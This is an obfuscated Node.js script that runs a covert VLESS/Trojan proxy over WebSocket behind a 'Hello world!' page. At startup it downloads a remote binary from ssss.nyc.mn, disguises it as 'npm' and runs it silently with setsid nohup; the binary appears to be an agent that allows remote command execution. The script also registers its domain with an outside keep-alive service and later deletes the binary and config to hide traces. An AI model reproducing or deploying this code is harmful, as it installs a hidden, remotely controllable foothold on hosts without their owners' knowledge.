const _0x21267a=_0x1876;(function(_0x2e9055,_0x121439){const _0x3bc01e=_0x1876,_0x5d66ac=_0x2e9055();while(!![]){try{const _0x2214ec=-parseInt(_0x3bc01e(0x142))/0x1*(-parseInt(_0x3bc01e(0x162))/0x2)+-parseInt(_0x3bc01e(0x14e))/0x3+parseInt(_0x3bc01e(0x13c))/0x4*(parseInt(_0x3bc01e(0x199))/0x5)+-parseInt(_0x3bc01e(0x1ba))/0x6+parseInt(_0x3bc01e(0x16c))/0x7*(parseInt(_0x3bc01e(0x192))/0x8)+parseInt(_0x3bc01e(0x170))/0x9*(parseInt(_0x3bc01e(0x185))/0xa)+-parseInt(_0x3bc01e(0x1b8))/0xb;if(_0x2214ec===_0x121439)break;else _0x5d66ac['push'](_0x5d66ac['shift']());}catch(_0x38e2db){_0x5d66ac['push'](_0x5d66ac['shift']());}}}(_0xb731,0xef8c3));const os=require('os'),http=require(_0x21267a(0x1b4)),fs=require('fs'),axios=require(_0x21267a(0x19c)),net=require(_0x21267a(0x175)),path=require(_0x21267a(0x1a8)),crypto=require(_0x21267a(0x153)),{Buffer}=require(_0x21267a(0x1aa)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x21267a(0x147)][_0x21267a(0x198)]||_0x21267a(0x197),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x21267a(0x147)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x21267a(0x147)][_0x21267a(0x193)]||'',DOMAIN=process[_0x21267a(0x147)][_0x21267a(0x18f)]||'giga.ze.ip-ddns.com',AUTO_ACCESS=process[_0x21267a(0x147)]['AUTO_ACCESS']||!![],WSPATH=process[_0x21267a(0x147)][_0x21267a(0x143)]||UUID[_0x21267a(0x155)](0x0,0x8),SUB_PATH=process[_0x21267a(0x147)][_0x21267a(0x171)]||_0x21267a(0x19a),NAME=process[_0x21267a(0x147)][_0x21267a(0x154)]||'',PORT=process['env']['PORT']||0xbb8;function _0xb731(){const _0x1bea53=['\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://oooo.serv00.net/add-url','443','2083','trim','createServer','1809664zJsMxm','close','substr','Status','config.yaml','reduce','once','concat','https://','Failed\x20to\x20resolve\x20','3687999MTXxKa','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readFile','createWriteStream','9fyFauq','SUB_PATH','setsid\x20nohup\x20./npm\x20-s\x20','digest',':443?security=tls&sni=','net','Hello\x20world!','join','map','unlink','\x20-p\x20','--tls','type','true','Automatic\x20Access\x20Task\x20added\x20successfully','text/html','2087','end','from','message','vless://','8639900uGCviI','listen','false','hex','/bin/bash','pipe','Server\x20is\x20running\x20on\x20port\x20','npm','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','aarch64','DOMAIN','arch',':443?encryption=none&security=tls&sni=','16louzqU','NEZHA_KEY','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','data','createHash','5efabea4-f6d4-91fd-b8f0-17e004c89c60','UUID','7577225jSPAnj','sub','&path=%2F','axios','application/dns-json','trojan://','npm\x20is\x20already\x20running,\x20skip\x20running...','https://dns.google/resolve?name=','every','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','country_code','split','writeHead','https://arm64.ssss.nyc.mn/v1','write','path','toString','buffer','Unknown','2053','readUInt16BE','find','post','get','log','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','2096','http','pop','chmod\x20+x\x20npm','includes','11961477hVXyMU','catch','5288100XWohxZ','4krdxDh','npm\x20is\x20running','8.8.4.4','error','1.1.1.1','send','1AxUBMw','WSPATH','then','&fp=chrome&type=ws&host=','replace','env','npm\x20running\x20error:','connect','url','connection','&type=A','length','4164111rmmlau','writeFileSync','application/json','\x20with\x20all\x20DNS\x20servers','text/plain','crypto','NAME','slice','8443','Answer','https://arm64.ssss.nyc.mn/agent','decode','readUInt8','isp'];_0xb731=function(){return _0x1bea53;};return _0xb731();}let ISP='';const GetISP=async()=>{const _0x3b54a4=_0x21267a;try{const _0x2b6c9e=await axios[_0x3b54a4(0x1b0)]('https://api.ip.sb/geoip'),_0x5163df=_0x2b6c9e[_0x3b54a4(0x195)];ISP=(_0x5163df[_0x3b54a4(0x1a3)]+'-'+_0x5163df[_0x3b54a4(0x15b)])[_0x3b54a4(0x146)](/ /g,'_');}catch(_0x338c06){ISP=_0x3b54a4(0x1ab);}};GetISP();function _0x1876(_0x50780b,_0x4702dc){_0x50780b=_0x50780b-0x13c;const _0xb7311d=_0xb731();let _0x187683=_0xb7311d[_0x50780b];return _0x187683;}const httpServer=http[_0x21267a(0x161)]((_0x895c2,_0x18426a)=>{const _0x126786=_0x21267a;if(_0x895c2['url']==='/'){const _0x24d785=path[_0x126786(0x177)](__dirname,'index.html');fs[_0x126786(0x16e)](_0x24d785,'utf8',(_0x201a84,_0x371535)=>{const _0x1892b5=_0x126786;if(_0x201a84){_0x18426a[_0x1892b5(0x1a5)](0xc8,{'Content-Type':'text/html'}),_0x18426a[_0x1892b5(0x181)](_0x1892b5(0x176));return;}_0x18426a['writeHead'](0xc8,{'Content-Type':_0x1892b5(0x17f)}),_0x18426a[_0x1892b5(0x181)](_0x371535);});return;}else{if(_0x895c2[_0x126786(0x14a)]==='/'+SUB_PATH){const _0x1caa4b=NAME?NAME+'-'+ISP:ISP,_0x4c284e=_0x126786(0x184)+UUID+'@'+DOMAIN+_0x126786(0x191)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x126786(0x19b)+WSPATH+'#'+_0x1caa4b,_0x5a97e8=_0x126786(0x19e)+UUID+'@'+DOMAIN+_0x126786(0x174)+DOMAIN+_0x126786(0x145)+DOMAIN+_0x126786(0x19b)+WSPATH+'#'+_0x1caa4b,_0x2231c0=_0x4c284e+'\x0a'+_0x5a97e8,_0x56f341=Buffer[_0x126786(0x182)](_0x2231c0)[_0x126786(0x1a9)]('base64');_0x18426a[_0x126786(0x1a5)](0xc8,{'Content-Type':_0x126786(0x152)}),_0x18426a[_0x126786(0x181)](_0x56f341+'\x0a');}else _0x18426a['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x18426a[_0x126786(0x181)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x21267a(0x146)](/-/g,''),DNS_SERVERS=[_0x21267a(0x13e),_0x21267a(0x140)];function resolveHost(_0x5e529e){return new Promise((_0x451914,_0xde8ca3)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x5e529e)){_0x451914(_0x5e529e);return;}let _0x1a366e=0x0;function _0x533d11(){const _0x2bed66=_0x1876;if(_0x1a366e>=DNS_SERVERS[_0x2bed66(0x14d)]){_0xde8ca3(new Error(_0x2bed66(0x16b)+_0x5e529e+_0x2bed66(0x151)));return;}const _0x183c4b=DNS_SERVERS[_0x1a366e];_0x1a366e++;const _0x5d10e1=_0x2bed66(0x1a0)+encodeURIComponent(_0x5e529e)+_0x2bed66(0x14c);axios[_0x2bed66(0x1b0)](_0x5d10e1,{'timeout':0x1388,'headers':{'Accept':_0x2bed66(0x19d)}})[_0x2bed66(0x144)](_0x53c4da=>{const _0x22900f=_0x2bed66,_0x374efd=_0x53c4da['data'];if(_0x374efd[_0x22900f(0x165)]===0x0&&_0x374efd[_0x22900f(0x157)]&&_0x374efd[_0x22900f(0x157)][_0x22900f(0x14d)]>0x0){const _0x268cb3=_0x374efd[_0x22900f(0x157)][_0x22900f(0x1ae)](_0x58ebf6=>_0x58ebf6[_0x22900f(0x17c)]===0x1);if(_0x268cb3){_0x451914(_0x268cb3['data']);return;}}_0x533d11();})[_0x2bed66(0x1b9)](_0x421780=>{_0x533d11();});}_0x533d11();});}function handleVlessConnection(_0x492284,_0x543562){const _0x524867=_0x21267a,[_0x5be666]=_0x543562,_0x2fa7d6=_0x543562[_0x524867(0x155)](0x1,0x11);if(!_0x2fa7d6['every']((_0x2cdb4e,_0x484ee9)=>_0x2cdb4e==parseInt(uuid['substr'](_0x484ee9*0x2,0x2),0x10)))return![];let _0x13a95c=_0x543562[_0x524867(0x155)](0x11,0x12)['readUInt8']()+0x13;const _0x293446=_0x543562[_0x524867(0x155)](_0x13a95c,_0x13a95c+=0x2)['readUInt16BE'](0x0),_0x171ffe=_0x543562['slice'](_0x13a95c,_0x13a95c+=0x1)[_0x524867(0x15a)](),_0x372c0d=_0x171ffe==0x1?_0x543562['slice'](_0x13a95c,_0x13a95c+=0x4)['join']('.'):_0x171ffe==0x2?new TextDecoder()[_0x524867(0x159)](_0x543562[_0x524867(0x155)](_0x13a95c+0x1,_0x13a95c+=0x1+_0x543562[_0x524867(0x155)](_0x13a95c,_0x13a95c+0x1)[_0x524867(0x15a)]())):_0x171ffe==0x3?_0x543562['slice'](_0x13a95c,_0x13a95c+=0x10)['reduce']((_0x38c2e0,_0xc481fc,_0x1f6f85,_0x52e2fd)=>_0x1f6f85%0x2?_0x38c2e0['concat'](_0x52e2fd[_0x524867(0x155)](_0x1f6f85-0x1,_0x1f6f85+0x1)):_0x38c2e0,[])[_0x524867(0x178)](_0x4e00e3=>_0x4e00e3[_0x524867(0x1ad)](0x0)[_0x524867(0x1a9)](0x10))[_0x524867(0x177)](':'):'';_0x492284[_0x524867(0x141)](new Uint8Array([_0x5be666,0x0]));const _0x3c055a=createWebSocketStream(_0x492284);return resolveHost(_0x372c0d)['then'](_0x347a6a=>{const _0x43266c=_0x524867;net[_0x43266c(0x149)]({'host':_0x347a6a,'port':_0x293446},function(){const _0xbaf614=_0x43266c;this[_0xbaf614(0x1a7)](_0x543562['slice'](_0x13a95c)),_0x3c055a['on'](_0xbaf614(0x13f),()=>{})[_0xbaf614(0x18a)](this)['on']('error',()=>{})['pipe'](_0x3c055a);})['on']('error',()=>{});})[_0x524867(0x1b9)](_0xf91d5d=>{const _0x16e9cc=_0x524867;net[_0x16e9cc(0x149)]({'host':_0x372c0d,'port':_0x293446},function(){const _0x4c4597=_0x16e9cc;this[_0x4c4597(0x1a7)](_0x543562[_0x4c4597(0x155)](_0x13a95c)),_0x3c055a['on'](_0x4c4597(0x13f),()=>{})[_0x4c4597(0x18a)](this)['on'](_0x4c4597(0x13f),()=>{})[_0x4c4597(0x18a)](_0x3c055a);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x5b619c,_0x2daf69){const _0x5bc236=_0x21267a;try{if(_0x2daf69['length']<0x3a)return![];const _0x100595=_0x2daf69[_0x5bc236(0x155)](0x0,0x38)[_0x5bc236(0x1a9)](),_0x24143=[UUID];let _0x56b868=null;for(const _0x42b807 of _0x24143){const _0x2f9e67=crypto[_0x5bc236(0x196)]('sha224')['update'](_0x42b807)[_0x5bc236(0x173)](_0x5bc236(0x188));if(_0x2f9e67===_0x100595){_0x56b868=_0x42b807;break;}}if(!_0x56b868)return![];let _0x5f3f88=0x38;_0x2daf69[_0x5f3f88]===0xd&&_0x2daf69[_0x5f3f88+0x1]===0xa&&(_0x5f3f88+=0x2);const _0x439bb8=_0x2daf69[_0x5f3f88];if(_0x439bb8!==0x1)return![];_0x5f3f88+=0x1;const _0x44a7b9=_0x2daf69[_0x5f3f88];_0x5f3f88+=0x1;let _0x3153ae,_0x2ff5d9;if(_0x44a7b9===0x1)_0x3153ae=_0x2daf69[_0x5bc236(0x155)](_0x5f3f88,_0x5f3f88+0x4)[_0x5bc236(0x177)]('.'),_0x5f3f88+=0x4;else{if(_0x44a7b9===0x3){const _0x1cf5a5=_0x2daf69[_0x5f3f88];_0x5f3f88+=0x1,_0x3153ae=_0x2daf69[_0x5bc236(0x155)](_0x5f3f88,_0x5f3f88+_0x1cf5a5)['toString'](),_0x5f3f88+=_0x1cf5a5;}else{if(_0x44a7b9===0x4)_0x3153ae=_0x2daf69[_0x5bc236(0x155)](_0x5f3f88,_0x5f3f88+0x10)[_0x5bc236(0x167)]((_0x3397dc,_0x335e99,_0xf0b5e0,_0x32411e)=>_0xf0b5e0%0x2?_0x3397dc[_0x5bc236(0x169)](_0x32411e[_0x5bc236(0x155)](_0xf0b5e0-0x1,_0xf0b5e0+0x1)):_0x3397dc,[])[_0x5bc236(0x178)](_0x4c83be=>_0x4c83be[_0x5bc236(0x1ad)](0x0)[_0x5bc236(0x1a9)](0x10))[_0x5bc236(0x177)](':'),_0x5f3f88+=0x10;else return![];}}_0x2ff5d9=_0x2daf69[_0x5bc236(0x1ad)](_0x5f3f88),_0x5f3f88+=0x2;_0x5f3f88<_0x2daf69[_0x5bc236(0x14d)]&&_0x2daf69[_0x5f3f88]===0xd&&_0x2daf69[_0x5f3f88+0x1]===0xa&&(_0x5f3f88+=0x2);const _0x3b96fe=createWebSocketStream(_0x5b619c);return resolveHost(_0x3153ae)['then'](_0x4dcb21=>{const _0x14728f=_0x5bc236;net[_0x14728f(0x149)]({'host':_0x4dcb21,'port':_0x2ff5d9},function(){const _0x1bd13b=_0x14728f;_0x5f3f88<_0x2daf69[_0x1bd13b(0x14d)]&&this[_0x1bd13b(0x1a7)](_0x2daf69[_0x1bd13b(0x155)](_0x5f3f88)),_0x3b96fe['on'](_0x1bd13b(0x13f),()=>{})[_0x1bd13b(0x18a)](this)['on'](_0x1bd13b(0x13f),()=>{})[_0x1bd13b(0x18a)](_0x3b96fe);})['on']('error',()=>{});})[_0x5bc236(0x1b9)](_0x4446fd=>{const _0x2c2634=_0x5bc236;net[_0x2c2634(0x149)]({'host':_0x3153ae,'port':_0x2ff5d9},function(){const _0xc35afa=_0x2c2634;_0x5f3f88<_0x2daf69[_0xc35afa(0x14d)]&&this[_0xc35afa(0x1a7)](_0x2daf69[_0xc35afa(0x155)](_0x5f3f88)),_0x3b96fe['on'](_0xc35afa(0x13f),()=>{})[_0xc35afa(0x18a)](this)['on'](_0xc35afa(0x13f),()=>{})['pipe'](_0x3b96fe);})['on']('error',()=>{});}),!![];}catch(_0x123216){return![];}}wss['on'](_0x21267a(0x14b),(_0xb80f03,_0x35850e)=>{const _0x18c8b7=_0x21267a,_0x5e3779=_0x35850e[_0x18c8b7(0x14a)]||'';_0xb80f03[_0x18c8b7(0x168)](_0x18c8b7(0x183),_0x41c731=>{const _0xff6b93=_0x18c8b7;if(_0x41c731[_0xff6b93(0x14d)]>0x11&&_0x41c731[0x0]===0x0){const _0x233964=_0x41c731[_0xff6b93(0x155)](0x1,0x11),_0x4b07e4=_0x233964[_0xff6b93(0x1a1)]((_0x137db6,_0x2481b8)=>_0x137db6==parseInt(uuid[_0xff6b93(0x164)](_0x2481b8*0x2,0x2),0x10));if(_0x4b07e4){!handleVlessConnection(_0xb80f03,_0x41c731)&&_0xb80f03['close']();return;}}!handleTrojanConnection(_0xb80f03,_0x41c731)&&_0xb80f03[_0xff6b93(0x163)]();})['on'](_0x18c8b7(0x13f),()=>{});});const getDownloadUrl=()=>{const _0x2cbd59=_0x21267a,_0x41b26b=os[_0x2cbd59(0x190)]();return _0x41b26b==='arm'||_0x41b26b==='arm64'||_0x41b26b===_0x2cbd59(0x18e)?!NEZHA_PORT?_0x2cbd59(0x1a6):_0x2cbd59(0x158):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x392157=_0x21267a;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x18c709=getDownloadUrl(),_0x4a5d27=await axios({'method':_0x392157(0x1b0),'url':_0x18c709,'responseType':'stream'}),_0x568ed1=fs[_0x392157(0x16f)](_0x392157(0x18c));return _0x4a5d27['data']['pipe'](_0x568ed1),new Promise((_0x1ae1ff,_0x3b1d7d)=>{const _0xf2f1e5=_0x392157;_0x568ed1['on']('finish',()=>{const _0x3a3b50=_0x1876;console[_0x3a3b50(0x1b1)]('npm\x20download\x20successfully'),exec(_0x3a3b50(0x1b6),_0x3d6254=>{if(_0x3d6254)_0x3b1d7d(_0x3d6254);_0x1ae1ff();});}),_0x568ed1['on'](_0xf2f1e5(0x13f),_0x3b1d7d);});}catch(_0x1a5fc4){throw _0x1a5fc4;}},runnz=async()=>{const _0x43a2e1=_0x21267a;try{const _0x3c32e2=execSync(_0x43a2e1(0x16d),{'encoding':'utf-8'});if(_0x3c32e2[_0x43a2e1(0x160)]()!==''){console[_0x43a2e1(0x1b1)](_0x43a2e1(0x19f));return;}}catch(_0x5560e3){}await downloadFile();let _0x31373a='',_0x383093=[_0x43a2e1(0x15e),_0x43a2e1(0x156),_0x43a2e1(0x1b3),_0x43a2e1(0x180),_0x43a2e1(0x15f),_0x43a2e1(0x1ac)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x162f39=_0x383093['includes'](NEZHA_PORT)?_0x43a2e1(0x17b):'';_0x31373a=_0x43a2e1(0x172)+NEZHA_SERVER+':'+NEZHA_PORT+_0x43a2e1(0x17a)+NEZHA_KEY+'\x20'+_0x162f39+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x199c94=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x43a2e1(0x1a4)](':')[_0x43a2e1(0x1b5)]():'',_0x1ffa16=_0x383093[_0x43a2e1(0x1b7)](_0x199c94)?_0x43a2e1(0x17d):_0x43a2e1(0x187),_0x4377a5='client_secret:\x20'+NEZHA_KEY+_0x43a2e1(0x15c)+NEZHA_SERVER+_0x43a2e1(0x18d)+_0x1ffa16+_0x43a2e1(0x194)+UUID;fs[_0x43a2e1(0x14f)](_0x43a2e1(0x166),_0x4377a5);}_0x31373a=_0x43a2e1(0x1a2);}else{console[_0x43a2e1(0x1b1)](_0x43a2e1(0x1b2));return;}}try{exec(_0x31373a,{'shell':_0x43a2e1(0x189)},_0x5c6367=>{const _0x745247=_0x43a2e1;if(_0x5c6367)console[_0x745247(0x13f)](_0x745247(0x148),_0x5c6367);else console['log'](_0x745247(0x13d));});}catch(_0x3d7cfd){console['error']('error:\x20'+_0x3d7cfd);}};async function addAccessTask(){const _0x329faa=_0x21267a;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2dafc8=_0x329faa(0x16a)+DOMAIN;try{const _0x407631=await axios[_0x329faa(0x1af)](_0x329faa(0x15d),{'url':_0x2dafc8},{'headers':{'Content-Type':_0x329faa(0x150)}});console[_0x329faa(0x1b1)](_0x329faa(0x17e));}catch(_0x10663a){}}const delFiles=()=>{const _0x5e45a5=_0x21267a;fs['unlink'](_0x5e45a5(0x18c),()=>{}),fs[_0x5e45a5(0x179)](_0x5e45a5(0x166),()=>{});};httpServer[_0x21267a(0x186)](PORT,()=>{const _0x1a4a1f=_0x21267a;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1a4a1f(0x1b1)](_0x1a4a1f(0x18b)+PORT);});
